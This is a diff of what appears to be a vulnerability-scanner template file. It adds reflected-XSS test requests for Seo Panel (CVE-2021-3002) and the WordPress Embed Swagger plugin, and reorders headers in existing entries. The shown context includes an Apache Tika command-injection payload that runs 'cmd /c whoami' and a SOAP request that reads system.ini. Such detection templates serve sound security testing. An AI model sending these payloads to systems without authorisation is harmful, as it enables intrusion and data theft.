@@ -6081,11 +6081,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -10561,9 +10561,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -13824,6 +13824,20 @@
       ]
     },
     {
+      "id": "CVE-2021-3002",
+      "info": {
+        "name": "Seo Panel 4.8.0 - Post based Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /seo/seopanel/login.php?sec=forgot HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3e11&code=AAAAA&login=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-30049",
       "info": {
         "name": "SysAid Technologies 20.3.64 b14 Reflected XSS",
@@ -15813,6 +15827,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0381",
+      "info": {
+        "name": "WordPress Plugin Embed Swagger 1.0.0 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22"
           ]
         }
       ]
